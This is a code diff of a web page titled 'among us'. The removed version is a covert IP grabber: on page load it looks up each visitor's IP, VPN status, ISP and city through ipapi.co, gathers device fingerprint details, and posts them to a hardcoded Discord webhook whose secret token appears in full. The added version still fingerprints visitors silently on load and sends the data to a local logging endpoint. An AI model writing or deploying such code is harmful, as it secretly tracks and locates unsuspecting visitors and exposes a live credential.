@@ -1,78 +1,27 @@
-<!DOCTYPE html>
-<html lang="ko">
-<head>
-  <meta charset="UTF-8">
-  <title>among</title>
-  <style>
-    body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
-    h1 { color: #333; }
-  </style>
-</head>
-<body>
-  <h1>us</h1>
+<script>
+async function sendLogToServer() {
+  const ua = navigator.userAgent;
+  const osInfo = navigator.platform;
+  const isMobile = /Mobi|Android/i.test(ua) ? "true" : "false";
+  const language = navigator.language;
+  const resolution = `${window.screen.width}x${window.screen.height}`;
+  const colorDepth = `${window.screen.colorDepth}bit`;
+  const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  const cores = navigator.hardwareConcurrency || "알 수 없음";
+  const ram = navigator.deviceMemory ? navigator.deviceMemory + "GB" : "알 수 없음";
+  const cookiesEnabled = navigator.cookieEnabled ? "true" : "false";
 
-  <script>
-    async function sendLog() {
-      const webhookURL = "https://discord.com/api/webhooks/1554829524456317000/g-aN0V0bngIgpupLFB6Fy5JpiEsQCZAcmIbm83F-OBbUMqRtAeaRUUiCSUC2QEI2qkFv"; 
+  const payload = {
+    ua, osInfo, isMobile, language, resolution, colorDepth,
+    timeZone, cores, ram, cookiesEnabled
+  };
 
-      const ua = navigator.userAgent;
-      const osInfo = navigator.platform;
-      const isMobile = /Mobi|Android/i.test(ua) ? "true" : "false";
+  fetch("http://localhost:3000/log", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload)
+  });
+}
 
-      const language = navigator.language;
-
-      const resolution = `${window.screen.width}x${window.screen.height}`;
-      const colorDepth = `${window.screen.colorDepth}bit`;
-
-      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-      const cores = navigator.hardwareConcurrency || "알 수 없음";
-      const ram = navigator.deviceMemory ? navigator.deviceMemory + "GB" : "알 수 없음";
-
-      let ip = "알 수 없음";
-      let vpn = "알 수 없음";
-      let isp = "알 수 없음";
-      let city = "알 수 없음";
-      let country = "알 수 없음";
-      try {
-        const res = await fetch("https://ipapi.co/json/");
-        const data = await res.json();
-        ip = data.ip;
-        vpn = data.proxy ? "true" : "false";
-        isp = data.org || "알 수 없음";
-        city = data.city || "알 수 없음";
-        country = data.country_name || "알 수 없음";
-      } catch (e) {
-        console.error("IP/VPN 가져오기 실패", e);
-      }
-
-      const payload = {
-        content: `📋 새로운 접속 로그
-IP: ${ip}
-VPN: ${vpn}
-브라우저 UA: ${ua}
-OS: ${osInfo}
-모바일: ${isMobile}
-언어: ${language}
-해상도: ${resolution}
-색상 깊이: ${colorDepth}
-타임존: ${timeZone}
-CPU 코어: ${cores}
-RAM: ${ram}
-ISP: ${isp}
-위치: ${city}, ${country}`
-      };
-
-      fetch(webhookURL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-      })
-      .then(r => console.log(r.ok ? "로그 전송 성공!" : "실패: " + r.status))
-      .catch(err => console.error("에러: " + err));
-    }
-
-    window.onload = sendLog;
-  </script>
-</body>
-</html>
+window.onload = sendLogToServer;
+    </script>
